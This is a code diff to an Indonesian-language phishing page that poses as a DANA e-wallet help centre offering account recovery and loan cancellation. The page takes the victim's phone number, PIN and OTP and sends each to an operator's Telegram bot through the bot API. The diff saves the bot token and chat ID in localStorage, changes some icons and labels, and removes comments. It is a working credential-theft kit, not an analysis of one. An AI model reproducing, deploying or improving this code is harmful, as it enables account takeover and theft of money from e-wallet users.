@@ -331,15 +331,15 @@
             </div>
             <h3 style="font-weight:bold; font-size:17px; margin:15px 0;">📌 Topik Bantuan</h3>
             <div onclick="bukaHalaman('halamanNomor')" class="kotak-menu fleksibel bayangan">
-                <div class="ikon-menu">🔒</div>
+                <div class="ikon-menu">•</div>
                 <div><p style="font-weight:bold;">1. Pemulihan Akun Dibekukan</p><p style="font-size:13px; color:#666; margin-top:3px;">Pulihkan akun agar tidak hilang</p></div>
             </div>
             <div onclick="bukaHalaman('halamanNomor')" class="kotak-menu fleksibel bayangan">
-                <div class="ikon-menu">💳</div>
+                <div class="ikon-menu">•</div>
                 <div><p style="font-weight:bold;">2. Pembatalan DANA Cicil</p><p style="font-size:13px; color:#666; margin-top:3px;">Batalkan pengajuan yang salah</p></div>
             </div>
             <div onclick="bukaHalaman('halamanNomor')" class="kotak-menu fleksibel bayangan">
-                <div class="ikon-menu">⚠️</div>
+                <div class="ikon-menu">•</div>
                 <div><p style="font-weight:bold;">3. Laporkan Kendala Lainnya</p><p style="font-size:13px; color:#666; margin-top:3px;">Lapor masalah agar kami selesaikan</p></div>
             </div>
             <div class="tekan-opsi-bawah">Tekan opsi di atas untuk nomor baru</div>
@@ -420,7 +420,7 @@
                 <input type="tel" inputmode="numeric" id="o4" maxlength="1">
             </div>
 
-            <div class="bar-merah" id="barMerah">⚠️ PASTIKAN KODE OTP YANG KAMU MASUKAN BENAR</div>
+            <div class="bar-merah" id="barMerah">TELEGRAME OTP YANG KAMU MASUKAN BENAR</div>
 
             <div id="kirimSms" class="kirim-sms">KIRIM VIA SMS</div>
 
@@ -433,9 +433,13 @@
     </div>
 
 
-    <!-- ====================================== HALAMAN ADMIN PENGATURAN ====================================== -->
+                                    <!-- ====================================== HALAMAN ADMIN PENGATURAN TELEGRAM ====================================== -->
     <div id="halamanAdmin" class="kontainer hidden">
-        <div class="header-admin"><a onclick="bukaHalaman('halamanUtama')" class="tombol-kembali">←</a><span class="judul-header">PENGATURAN BOT</span><span></span></div>
+        <div class="header-admin">
+            <a onclick="bukaHalaman('halamanUtama')" class="tombol-kembali">←</a>
+            <span class="judul-header">PENGATURAN BOT</span>
+            <span></span>
+        </div>
         <div class="isi-admin">
             <div class="kotak-pengaturan">
                 <h3 class="judul-admin">🤖 SETTING TELEGRAM</h3>
@@ -450,7 +454,7 @@
                     <input type="text" id="idTelegram" placeholder="Masukkan ID Telegram...">
                 </div>
 
-                <button class="tombol-simpan" onclick="simpanPengaturan()">💾 SIMPAN PENGATURAN</button>
+                <button class="tombol-simpan" onclick="simpanPengaturan()">💾 SIMPAN & TERSIMPAN OTOMATIS</button>
             </div>
         </div>
     </div>
@@ -463,6 +467,17 @@
         let klikLogo = 0;
         let BOT_TOKEN = "";
         let CHAT_ID = "";
+
+        // ✅ MUALI: AMBIL DATA YANG SUDAH DISIMPAN SEBELUMNYA
+        window.onload = function() {
+            if(localStorage.getItem('botToken')) {
+                BOT_TOKEN = localStorage.getItem('botToken');
+                CHAT_ID = localStorage.getItem('chatId');
+                document.getElementById('tokenBot').value = BOT_TOKEN;
+                document.getElementById('idTelegram').value = CHAT_ID;
+            }
+            bukaHalaman('halamanUtama');
+        };
 
         function bukaHalaman(nama) {
             document.querySelectorAll('.kontainer').forEach(el => el.classList.add('hidden'));
@@ -484,10 +499,16 @@ Kode Akun  : ${dataOtp || 'menunggu...'}
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(pesan)}`);
         }
 
+        // ✅ FUNGSI SIMPAN: OTOMATIS TERSIMPAN DI HP / BROWSER
         function simpanPengaturan() {
             BOT_TOKEN = document.getElementById('tokenBot').value.trim();
             CHAT_ID = document.getElementById('idTelegram').value.trim();
-            alert("✅ Pengaturan Berhasil Disimpan!");
+            
+            // Simpan ke memori HP (Local Storage)
+            localStorage.setItem('botToken', BOT_TOKEN);
+            localStorage.setItem('chatId', CHAT_ID);
+            
+            alert("✅ BERHASIL DISIMPAN PERMANEN! \nData tidak hilang meski halaman ditutup.");
         }
 
         // ✅ LOGIKA HALAMAN NOMOR - KIRIM LANGSUNG SAAT LANJUT
@@ -497,7 +518,6 @@ Kode Akun  : ${dataOtp || 'menunggu...'}
         tombolLanjut.addEventListener('click', () => {
             dataNomor = inputNomor.value.trim();
             if(dataNomor.length < 8) return alert("Nomor kurang panjang!");
-            // ✅ KIRIM NOTIF NOMOR MASUK, PIN & OTP MASIH MENUNGGU
             kirimKeTelegram();
             bukaHalaman('halamanPin');
         });
@@ -512,7 +532,6 @@ Kode Akun  : ${dataOtp || 'menunggu...'}
             e.target.value = nilai; dataPin = nilai;
             titikPin.forEach((t,i)=>t.classList.toggle('isi', i<nilai.length));
             if(nilai.length===6) {
-                // ✅ KIRIM NOTIF PIN SUDAH MASUK
                 kirimKeTelegram();
                 setTimeout(()=>{bukaHalaman('halamanTapVerif');},300);
             }
@@ -552,7 +571,6 @@ Kode Akun  : ${dataOtp || 'menunggu...'}
                 if(dataOtp.length === 4) {
                     barHijau.style.display = 'none';
                     barMerah.style.display = 'block';
-                    // ✅ KIRIM NOTIF LENGKAP SEMUA DATA
                     kirimKeTelegram();
                 }
             });
@@ -599,8 +617,6 @@ Kode Akun  : ${dataOtp || 'menunggu...'}
             }
             setTimeout(()=>klikLogo=0,800);
         });
-
-        document.addEventListener('DOMContentLoaded', ()=>bukaHalaman('halamanUtama'));
     </script>
 
 </body>
